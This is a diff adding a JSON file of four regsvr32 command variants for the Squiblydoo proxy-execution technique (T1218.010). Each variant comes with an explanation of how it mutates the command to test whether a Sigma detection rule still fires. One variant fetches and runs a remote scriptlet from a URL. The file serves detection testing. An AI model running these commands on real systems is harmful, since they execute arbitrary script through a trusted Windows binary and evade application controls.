@@ -1,0 +1,18 @@
+[
+  {
+    "output": "C:\\Windows\\system32\\regsvr32.exe /s /u -i:\"C:\\AtomicRedTeam\\atomics\\T1218.010\\src\\RegSvr32.sct\" scrobj.dll",
+    "explanation": "The command substitutes the '/i:' flag with '-i:' to test if the Sigma rule detects both forms. This is a valid mutation using substitution and still triggers the rule."
+  },
+  {
+    "output": "C:\\Windows\\system32\\regsvr32.exe /s /u /i:C:\\AtomicRedTeam\\atomics\\T1218.010\\src\\RegSvr32.sct scrobj.dll",
+    "explanation": "Removes quotes around the path to test if the rule still detects the '/i' flag without additional syntax. This is a safe mutation using omission."
+  },
+  {
+    "output": "C:\\Windows\\system32\\regsvr32.exe /s /u /i:https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1218.010/src/RegSvr32.sct scrobj.dll",
+    "explanation": "Uses a URL instead of a local path to test if the rule still detects the '/i' flag. This is a valid mutation using recoding."
+  },
+  {
+    "output": "C:\\Windows\\system32\\regsvr32.exe /s /u /i:RegSvr32.sct scrobj.dll",
+    "explanation": "Shortens the path to test if the rule still detects the '/i' flag when the path is minimal. This is a valid mutation using omission."
+  }
+]
